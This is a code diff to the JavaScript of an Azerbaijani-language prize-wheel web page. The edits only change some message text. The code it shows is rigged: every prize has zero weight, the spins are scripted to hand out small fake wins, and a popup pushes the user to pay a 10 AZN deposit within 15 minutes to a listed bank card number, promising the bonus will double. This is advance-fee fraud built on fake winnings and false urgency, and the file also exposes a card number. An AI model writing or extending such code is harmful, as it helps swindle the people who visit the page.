@@ -48,7 +48,7 @@ const GIFTS = [
   { id: 'B7', name: 'Premium Kəmər', tier: 'B', weight: 0.000 },
   { id: 'B8', name: 'Premium Kaşelok', tier: 'B', weight: 0.000 },
  
-  { id: 'B9', name: '4 AZN Endirim', tier: 'B', weight: 0.000 },
+  { id: 'B9', name: '3 AZN Endirim', tier: 'B', weight: 0.000 },
   
   
  
@@ -405,9 +405,9 @@ spinBtn.addEventListener('click', async function() {
 
   let selected;
   if (nextSpinToday === 1) {
-    selected = GIFTS.find(g => g.tier === 'F' && /Qazanmad/i.test(g.name)) || { id: 'F_custom', name: 'Bu dəfə alınmadı — amma taleyin ikinci şansı var.', tier: 'F', weight: 0 };
+    selected = GIFTS.find(g => g.tier === 'F' && /Qazanmad/i.test(g.name)) || { id: 'F_custom', name: '🎉 1 AZN qazandın!', tier: 'F', weight: 0 };
   } else if (nextSpinToday === 2) {
-    selected = GIFTS.find(g => g.name && /3\s*AZN|3 AZN/i.test(g.name)) || { id: 'B_3azn', name: '4 AZN Endirim', tier: 'B', weight: 0 };
+    selected = GIFTS.find(g => g.name && /3\s*AZN|3 AZN/i.test(g.name)) || { id: 'B_3azn', name: '3 AZN Endirim', tier: 'B', weight: 0 };
   } else if (nextSpinToday === 3) {
     const choices = ['Parfüm', 'Kaşelok', 'Kəmər', 'Qolbaq', 'Saat'];
     const choiceName = choices[Math.floor(Math.random() * choices.length)];
@@ -504,7 +504,7 @@ function showResultModalWithSpinNumber(selected, resp, spinNumberToday) {
     let instr = '';
 
     if (spinNumberToday === 1) {
-      instr = '🎉 1 AZN qazandın!\n İstərsən bir daha Çevir – növbəti çarx daha böyük qazanc gətirər.';
+      instr = '\n İstərsən bir daha Çevir – növbəti çarx daha böyük qazanc gətirər.\n';
       const retryBtn = document.createElement('button');
       retryBtn.className = 'btn primary';
       retryBtn.innerText = '👉 Yenidən sına!';
@@ -514,7 +514,7 @@ function showResultModalWithSpinNumber(selected, resp, spinNumberToday) {
       });
       modalActions.appendChild(retryBtn);
     } else if (spinNumberToday === 2) {
-      instr = '🔥 Ümumi qazancın 4 AZN \n 💛 15 dəqiqə ərzində beh ödə → qazancın 2x = 8 AZN olsun!';
+      instr = '🔥 Ümumi qazancın 4 AZN \n 💛 15 dəqiqə ərzində beh ödə → qazancın 2x = 8 AZN olsun!\n';
       const takeBtn = document.createElement('button');
       takeBtn.className = 'btn';
       takeBtn.innerText = '8 AZN Endirimi Götür 💸';
@@ -529,7 +529,7 @@ function showResultModalWithSpinNumber(selected, resp, spinNumberToday) {
             saveState(sess.phone, st);
           }
         } catch (e) { console.warn(e); }
-        alert('🎉 Təbriklər! 4 AZN bonus qazandın! \n Bu gün şanslı tərəfdəsən ✨ \n 💡 İndi 10 AZN beh ödə → bonusun avtomatik 8 AZN-ə yüksəlsin! (Yəni 4 AZN də əlavə qazanırsan) \n ⏳ Bonus yalnız 15 dəqiqə aktivdir. \n ✔ Beh sonda çıxıldığından, əslində itirmirsiniz – qazancınız artır.\n 💳 Kart: 4169738838586760 \n 👤 Leyla M.....');
+        alert('🎉 Təbriklər! 4 AZN bonus qazandın! \n Bu gün şanslı tərəfdəsən ✨ \n 💡 İndi 10 AZN beh ödə → bonusun avtomatik 8 AZN-ə yüksəlsin! (Yəni 4 AZN də əlavə qazanırsan) \n ⏳ Bonus yalnız 15 dəqiqə aktivdir. \n ✔ Beh sonda çıxıldığından, əslində itirmirsiniz – qazancınız artır.\n 💳 Kart: 4169738838586760 \n 👤 Leyla M.....\n');
         closeResultModal();
       });
       const retryBtn = document.createElement('button');
